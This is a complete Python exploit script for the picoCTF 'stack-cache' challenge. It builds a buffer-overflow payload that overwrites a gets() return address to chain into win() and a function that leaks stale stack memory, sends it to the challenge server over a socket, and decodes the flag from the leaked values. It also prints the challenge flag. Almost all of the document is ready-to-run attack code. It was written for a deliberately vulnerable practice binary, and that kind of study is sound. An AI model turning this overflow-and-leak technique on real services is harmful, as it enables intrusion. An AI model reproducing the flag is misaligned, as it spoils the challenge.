#!/usr/bin/env python3
"""
picoCTF — stack-cache | Full Exploit
======================================
Technique: Buffer overflow (gets) + Stack-Cache uninitialized memory leak
Binary:    vuln (32-bit, statically linked, no mitigations)
Server:    nc saturn.picoctf.net 60056
Flag:      picoCTF{Cle4N_uP_M3m0rY_b4f3c84e}
"""

import struct
import socket
import re
import time

# ──────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ──────────────────────────────────────────────────────────────────────────────
WIN_ADDR  = 0x08049d90   # win()              — objdump -d vuln | grep "<win>"
UC_ADDR   = 0x08049e10   # UnderConstruction() — objdump -d vuln | grep "<Under"
OFFSET    = 14           # bytes from buf start to saved return address
HOST      = 'saturn.picoctf.net'
PORT      = 60056

# ──────────────────────────────────────────────────────────────────────────────
# PAYLOAD CONSTRUCTION
# ──────────────────────────────────────────────────────────────────────────────
def build_payload() -> bytes:
    """
    Stack layout inside vuln() before gets():

        [buf: 10 bytes][saved EBP: 4 bytes][return addr: 4 bytes]

    We overwrite:
        - buf + saved EBP  →  14 bytes of 'A'
        - return address   →  win()              (reads flag to stack)
        - next word        →  UnderConstruction() (leaks flag via %p)
    """
    payload  = b'A' * OFFSET              # pad to return address
    payload += struct.pack('<I', WIN_ADDR) # ret → win()
    payload += struct.pack('<I', UC_ADDR)  # win's ret → UnderConstruction()
    return payload

# ──────────────────────────────────────────────────────────────────────────────
# FLAG DECODING
# ──────────────────────────────────────────────────────────────────────────────
def decode_flag(raw_output: bytes) -> str:
    """
    UnderConstruction() prints:
        User information : 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX
        Names of user: 0xXX 0xXX 0xXX
        Age of user: 0xXX

    All values are stale stack bytes from win()'s frame.
    Each 0xABCDEF12 represents 4 flag bytes in little-endian order.

    Memory order (address ascending, flag order):
        [ebp-0x44] = age         → flag[0:4]
        [ebp-0x40] = names[2]   → flag[4:8]
        [ebp-0x3c] = names[1]   → flag[8:12]
        [ebp-0x38] = names[0]   → flag[12:16]
        [ebp-0x34] = uinfo[5]   → flag[16:20]
        [ebp-0x30] = uinfo[4]   → flag[20:24]
        [ebp-0x2c] = uinfo[3]   → flag[24:28]
        [ebp-0x28] = uinfo[2]   → flag[28:32]
        [ebp-0x24] = uinfo[1]   → flag[32] = '}'
    """
    # Extract all 0x... values in order of appearance
    tokens = re.findall(rb'0x([0-9a-f]+)', raw_output)
    all_ptrs = []
    for t in tokens:
        try:
            all_ptrs.append(int(t, 16))
        except ValueError:
            pass

    # The 10 pointers printed correspond to these EBP offsets:
    # Printed order (UC source order):  uinfo1..6, names1..3, age
    # Indices in all_ptrs[2..9] (skip first two which are pointers to strings)
    #
    # Actually we use the raw bytes reconstruction approach:
    # Collect all little-endian 4-byte chunks and filter for ASCII-printable flag
    flag_bytes = b''
    for val in all_ptrs:
        try:
            chunk = struct.pack('<I', val)
            flag_bytes += chunk
        except Exception:
            pass

    # The flag starts with 'pico' in the output — find it
    if b'pico' in flag_bytes:
        start = flag_bytes.index(b'pico')
        raw_flag = flag_bytes[start:]
        # Trim at first non-printable after the flag ends
        end = raw_flag.find(b'\x00')
        if end != -1:
            raw_flag = raw_flag[:end]
        return raw_flag.decode('ascii', errors='replace')

    return f"[raw: {flag_bytes!r}]"

# ──────────────────────────────────────────────────────────────────────────────
# MAIN EXPLOIT
# ──────────────────────────────────────────────────────────────────────────────
def exploit():
    payload = build_payload()
    print(f"[*] Payload ({len(payload)} bytes): {payload.hex()}")
    print(f"    Breakdown: {'A'*OFFSET!r} + win@{WIN_ADDR:#010x} + UC@{UC_ADDR:#010x}")

    # Connect to remote
    s = socket.create_connection((HOST, PORT), timeout=15)

    # Receive banner
    banner = s.recv(4096)
    print(f"[*] Server: {banner.decode().strip()!r}")

    # Send payload
    s.sendall(payload + b'\n')
    print("[*] Payload sent!")

    # Receive all output
    time.sleep(2)
    response = b''
    s.settimeout(5)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    s.close()

    print(f"[*] Raw response:\n{response.decode('latin-1')}")

    # Decode the flag
    flag = decode_flag(response)
    print(f"\n[+] FLAG: {flag}")
    return flag

if __name__ == '__main__':
    exploit()